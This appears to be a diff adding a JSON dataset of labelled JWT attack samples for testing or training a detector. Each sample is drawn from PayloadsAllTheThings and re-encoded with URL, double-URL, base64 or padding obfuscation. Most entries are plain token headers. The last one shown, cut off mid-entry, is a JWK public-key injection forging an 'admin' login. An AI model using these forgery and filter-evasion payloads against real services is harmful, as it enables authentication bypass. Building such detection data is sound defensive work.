@@ -1,0 +1,1991 @@
+[
+  {
+    "id": "raw_jwt_00001__obf01",
+    "payload": "{\n    \"%74y%70\": \"JWT\",\n    \"al%67\": \"HS%325%36\"\n}",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18a3abb69ffae551bbc53a9d0e07ad9c3d7058c4ff17f9cb5a378942681eb5bb",
+    "original_id": "raw_jwt_00001",
+    "original_payload": "{\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\"\n}",
+    "obfuscated_payload": "{\n    \"%74y%70\": \"JWT\",\n    \"al%67\": \"HS%325%36\"\n}",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64963061,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00001__obf02",
+    "payload": "ewogICAgInR5cCI6ICJKV1QiLAogICAgImFsZyI6ICJIUzI1NiIKfQ",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18a3abb69ffae551bbc53a9d0e07ad9c3d7058c4ff17f9cb5a378942681eb5bb",
+    "original_id": "raw_jwt_00001",
+    "original_payload": "{\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\"\n}",
+    "obfuscated_payload": "ewogICAgInR5cCI6ICJKV1QiLAogICAgImFsZyI6ICJIUzI1NiIKfQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64964070,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00001__obf03",
+    "payload": "{\n    \"t%79p\": \"JWT\",\n    \"a%6Cg\": \"HS%3256\"\n}",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18a3abb69ffae551bbc53a9d0e07ad9c3d7058c4ff17f9cb5a378942681eb5bb",
+    "original_id": "raw_jwt_00001",
+    "original_payload": "{\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\"\n}",
+    "obfuscated_payload": "{\n    \"t%79p\": \"JWT\",\n    \"a%6Cg\": \"HS%3256\"\n}",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64965079,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00001__obf04",
+    "payload": "{\n    \"ty%70\": \"JWT\",\n    \"alg\": \"HS256\"\n}",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00001",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "18a3abb69ffae551bbc53a9d0e07ad9c3d7058c4ff17f9cb5a378942681eb5bb",
+    "original_id": "raw_jwt_00001",
+    "original_payload": "{\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\"\n}",
+    "obfuscated_payload": "{\n    \"ty%70\": \"JWT\",\n    \"alg\": \"HS256\"\n}",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64966088,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00002__obf01",
+    "payload": "%22alg%22%3A%20%22HS256%22",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0e2b2136f6de681c3c48900bf4a6d856680ca449d44995eee54e2385b131b97",
+    "original_id": "raw_jwt_00002",
+    "original_payload": "\"alg\": \"HS256\"",
+    "obfuscated_payload": "%22alg%22%3A%20%22HS256%22",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65063064,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00002__obf02",
+    "payload": "ImFsZyI6ICJIUzI1NiI=",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0e2b2136f6de681c3c48900bf4a6d856680ca449d44995eee54e2385b131b97",
+    "original_id": "raw_jwt_00002",
+    "original_payload": "\"alg\": \"HS256\"",
+    "obfuscated_payload": "ImFsZyI6ICJIUzI1NiI=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 65064073,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00002__obf03",
+    "payload": "\"al%67\": \"%48S256\"",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0e2b2136f6de681c3c48900bf4a6d856680ca449d44995eee54e2385b131b97",
+    "original_id": "raw_jwt_00002",
+    "original_payload": "\"alg\": \"HS256\"",
+    "obfuscated_payload": "\"al%67\": \"%48S256\"",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65065082,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00002__obf04",
+    "payload": "%2522alg%2522%253A%2520%2522HS256%2522",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00002",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "e0e2b2136f6de681c3c48900bf4a6d856680ca449d44995eee54e2385b131b97",
+    "original_id": "raw_jwt_00002",
+    "original_payload": "\"alg\": \"HS256\"",
+    "obfuscated_payload": "%2522alg%2522%253A%2520%2522HS256%2522",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 65066091,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00003__obf01",
+    "payload": "%257B%2522alg%2522%253A%2522HS256%2522%252C%2522typ%2522%253A%2522JWT%2522%257D.%250A%257B%2522sub%2522%253A%25221234567890%2522%252C%2522name%2522%253A%2522John%2520Doe%2522%252C%2522iat%2522%253A1516239022%257D",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ad0f0e9579228297b17999aec6c9f93adc352ee16f77fb14bc3abbb273749b98",
+    "original_id": "raw_jwt_00003",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}",
+    "obfuscated_payload": "%257B%2522alg%2522%253A%2522HS256%2522%252C%2522typ%2522%253A%2522JWT%2522%257D.%250A%257B%2522sub%2522%253A%25221234567890%2522%252C%2522name%2522%253A%2522John%2520Doe%2522%252C%2522iat%2522%253A1516239022%257D",
+    "obfuscation_chain": [
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode_twice"
+    ],
+    "generation_seed": 65163067,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00003__obf02",
+    "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Lgp7InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJ9",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ad0f0e9579228297b17999aec6c9f93adc352ee16f77fb14bc3abbb273749b98",
+    "original_id": "raw_jwt_00003",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}",
+    "obfuscated_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Lgp7InN1YiI6IjEyMzQ1Njc4OTAiLCJuYW1lIjoiSm9obiBEb2UiLCJpYXQiOjE1MTYyMzkwMjJ9",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 65164076,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00003__obf03",
+    "payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}=.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ad0f0e9579228297b17999aec6c9f93adc352ee16f77fb14bc3abbb273749b98",
+    "original_id": "raw_jwt_00003",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}",
+    "obfuscated_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}=.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}",
+    "obfuscation_chain": [
+      "jwt_padding"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 65165085,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_jwt_00003__obf04",
+    "payload": "{\"al%67\":\"HS%32%356\",\"%74%79p\":\"JWT\"}.\n{\"su%62\":\"1%32345%3678%390\",\"name\":\"J%6Fhn %44o%65\",\"iat\":151%36239022}",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00003",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ad0f0e9579228297b17999aec6c9f93adc352ee16f77fb14bc3abbb273749b98",
+    "original_id": "raw_jwt_00003",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.\n{\"sub\":\"1234567890\",\"name\":\"John Doe\",\"iat\":1516239022}",
+    "obfuscated_payload": "{\"al%67\":\"HS%32%356\",\"%74%79p\":\"JWT\"}.\n{\"su%62\":\"1%32345%3678%390\",\"name\":\"J%6Fhn %44o%65\",\"iat\":151%36239022}",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65166094,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00004__obf01",
+    "payload": "%7B\"alg%22%3A%22HS256%22,%22typ%22%3A%22JWT%22%7D.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "868ecd0cebc86d6ff431ce87a1e5b0e75f4c2c0e9b55b3f320161bba848929af",
+    "original_id": "raw_jwt_00004",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.",
+    "obfuscated_payload": "%7B\"alg%22%3A%22HS256%22,%22typ%22%3A%22JWT%22%7D.",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65263070,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00004__obf02",
+    "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Lg==",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "868ecd0cebc86d6ff431ce87a1e5b0e75f4c2c0e9b55b3f320161bba848929af",
+    "original_id": "raw_jwt_00004",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.",
+    "obfuscated_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9Lg==",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 65264079,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00004__obf03",
+    "payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}=.",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "868ecd0cebc86d6ff431ce87a1e5b0e75f4c2c0e9b55b3f320161bba848929af",
+    "original_id": "raw_jwt_00004",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.",
+    "obfuscated_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}=.",
+    "obfuscation_chain": [
+      "jwt_padding"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [],
+    "generation_seed": 65265088,
+    "equivalence_scope": "parser-or-runtime-dependent"
+  },
+  {
+    "id": "raw_jwt_00004__obf04",
+    "payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9PS4=",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00004",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "868ecd0cebc86d6ff431ce87a1e5b0e75f4c2c0e9b55b3f320161bba848929af",
+    "original_id": "raw_jwt_00004",
+    "original_payload": "{\"alg\":\"HS256\",\"typ\":\"JWT\"}.",
+    "obfuscated_payload": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9PS4=",
+    "obfuscation_chain": [
+      "jwt_padding",
+      "base64_standard"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 65266097,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00005__obf01",
+    "payload": "eyJ0%65XAiOiJK%561Q%69LC%4AhbG%63iOiJI%55zI1NiJ9.eyJpZCI6Ij%49zIiwidXN%6Ccm5h%62WUiOiJ2%61XNpdG9yIiw%69%63m9sZS%496IjE%69fQ.j%30IbN%5262%48_Im34jV%4Aqfp%75%62t7g%6A%6Coj%42-%47L%79YaDFiJEOA",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3baca2072a7f6f18ff52fedbffd3325bdd466669c6457232936c2a6fe2836d7b",
+    "original_id": "raw_jwt_00005",
+    "original_payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA",
+    "obfuscated_payload": "eyJ0%65XAiOiJK%561Q%69LC%4AhbG%63iOiJI%55zI1NiJ9.eyJpZCI6Ij%49zIiwidXN%6Ccm5h%62WUiOiJ2%61XNpdG9yIiw%69%63m9sZS%496IjE%69fQ.j%30IbN%5262%48_Im34jV%4Aqfp%75%62t7g%6A%6Coj%42-%47L%79YaDFiJEOA",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65363073,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00005__obf02",
+    "payload": "ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUo5LmV5SnBaQ0k2SWpJeklpd2lkWE5sY201aGJXVWlPaUoyYVhOcGRHOXlJaXdpY205c1pTSTZJakVpZlEuajBJYk5SNjJIX0ltMzRqVkpxZnB1YnQ3Z2psb2pCLUdMeVlhREZpSkVPQQ==",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3baca2072a7f6f18ff52fedbffd3325bdd466669c6457232936c2a6fe2836d7b",
+    "original_id": "raw_jwt_00005",
+    "original_payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA",
+    "obfuscated_payload": "ZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKSVV6STFOaUo5LmV5SnBaQ0k2SWpJeklpd2lkWE5sY201aGJXVWlPaUoyYVhOcGRHOXlJaXdpY205c1pTSTZJakVpZlEuajBJYk5SNjJIX0ltMzRqVkpxZnB1YnQ3Z2psb2pCLUdMeVlhREZpSkVPQQ==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 65364082,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_jwt_00005__obf03",
+    "payload": "e%79%4A%30eXAiOiJKV%31QiL%43%4Ahb%47ciOiJIUzI1Ni%4A%39==.eyJpZCI6Ij%49zIi%77i%64XNlcm%35h%62WU%69OiJ%32a%58N%70dG9yI%69wi%63m9%73ZS%496IjEif%51==.j0I%62NR62H_Im3%34j%56Jq%66pubt7%67j%6CojB-GLy%59%61%44FiJEOA===",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3baca2072a7f6f18ff52fedbffd3325bdd466669c6457232936c2a6fe2836d7b",
+    "original_id": "raw_jwt_00005",
+    "original_payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA",
+    "obfuscated_payload": "e%79%4A%30eXAiOiJKV%31QiL%43%4Ahb%47ciOiJIUzI1Ni%4A%39==.eyJpZCI6Ij%49zIi%77i%64XNlcm%35h%62WU%69OiJ%32a%58N%70dG9yI%69wi%63m9%73ZS%496IjEif%51==.j0I%62NR62H_Im3%34j%56Jq%66pubt7%67j%6CojB-GLy%59%61%44FiJEOA===",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "jwt_padding"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "specific",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 65365091,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00005__obf04",
+    "payload": "eyJ%252530eXAi%25254FiJKV1Q%252569LCJh%252562GciOiJI%252555zI1%25254EiJ9.e%252579JpZCI%252536IjI%25257AIiw%252569d%252558Nlc%25256D5%252568bWUiOi%25254A2%252561XN%252570dG%252539yIiw%252569c%25256D%252539sZSI6IjEifQ.j0I%252562NR%252536%252532H_I%25256D34j%252556Jqf%252570u%252562t7gjlo%25256A%252542-GLy%252559a%252544Fi%25254AEOA",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00005",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "3baca2072a7f6f18ff52fedbffd3325bdd466669c6457232936c2a6fe2836d7b",
+    "original_id": "raw_jwt_00005",
+    "original_payload": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA",
+    "obfuscated_payload": "eyJ%252530eXAi%25254FiJKV1Q%252569LCJh%252562GciOiJI%252555zI1%25254EiJ9.e%252579JpZCI%252536IjI%25257AIiw%252569d%252558Nlc%25256D5%252568bWUiOi%25254A2%252561XN%252570dG%252539yIiw%252569c%25256D%252539sZSI6IjEifQ.j0I%252562NR%252536%252532H_I%25256D34j%252556Jqf%252570u%252562t7gjlo%25256A%252542-GLy%252559a%252544Fi%25254AEOA",
+    "obfuscation_chain": [
+      "url_encode_unreserved",
+      "double_url_encode"
+    ],
+    "obfuscation_depth": 2,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode",
+      "url_decode_twice"
+    ],
+    "generation_seed": 65366100,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_jwt_00006__obf01",
+    "payload": "%7B%0A%20%20%22alg%22%3A%20%22RS256%22%2C%0A%20%20%22typ%22%3A%20%22JWT%22%2C%0A%20%20%22jwk%22%3A%20%7B%0A%20%20%20%20%22kty%22%3A%20%22RSA%22%2C%0A%20%20%20%20%22kid%22%3A%20%22jwt_tool%22%2C%0A%20%20%20%20%22use%22%3A%20%22sig%22%2C%0A%20%20%20%20%22e%22%3A%20%22AQAB%22%2C%0A%20%20%20%20%22n%22%3A%20%22uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw%22%0A%20%20%7D%0A%7D.%0A%7B%22login%22%3A%22admin%22%7D.%0A%5BSigned%20with%20new%20Private%20key%3B%20Public%20key%20injected%5D",
+    "label": 1,
+    "attack_type": "jwt",
+    "attack_subtype": "external_curated",
+    "param_location": "header",
+    "source": "Generated:raw_jwt_00006",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/JSON%20Web%20Token/README.md",
+    "source_path": "JSON Web Token/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "ee32f26808449c6d6c0218e684d256d962f8eb777226628902d3a7911c187c36",
+    "original_id": "raw_jwt_00006",
